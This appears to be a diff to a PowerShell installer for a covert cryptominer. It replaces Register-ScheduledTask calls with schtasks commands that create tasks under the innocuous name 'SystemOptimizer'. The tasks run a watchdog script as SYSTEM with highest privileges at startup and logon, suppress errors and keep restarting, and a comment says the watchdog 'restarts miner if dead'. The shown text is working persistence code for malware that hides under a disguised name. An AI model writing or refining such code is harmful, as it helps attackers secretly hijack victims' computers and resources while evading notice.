@@ -78,14 +78,14 @@ if (Test-Path $driverPath) {
     Start-Service $svc -ErrorAction SilentlyContinue
 }
 
-# Create scheduled task (SYSTEM, hidden, auto-restart on failure)
+# Create scheduled task using schtasks (more reliable)
 $taskName = "SystemOptimizer"
-$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$baseDir\watchdog.vbs`""
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$trigger2 = New-ScheduledTaskTrigger -AtLogOn
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -RestartCount 999999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Hours 0)
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
+$taskCmd = "schtasks /Create /TN `"$taskName`" /TR `"wscript.exe `"$baseDir\watchdog.vbs`"`" /SC ONSTART /RU SYSTEM /RL HIGHEST /F /RL HIGHEST"
+cmd /c $taskCmd 2>$null
+$taskCmd2 = "schtasks /Create /TN `"$taskName-Logon`" /TR `"wscript.exe `"$baseDir\watchdog.vbs`"`" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F"
+cmd /c $taskCmd2 2>$null
+# Enable auto-restart on failure
+schtasks /Change /TN "$taskName" /RI 1 /DU 9999:59 /K /F 2>$null
 
 # Create watchdog.vbs (persistent, restarts miner if dead) - write directly
 $watchdogPath = "$baseDir\watchdog.vbs"
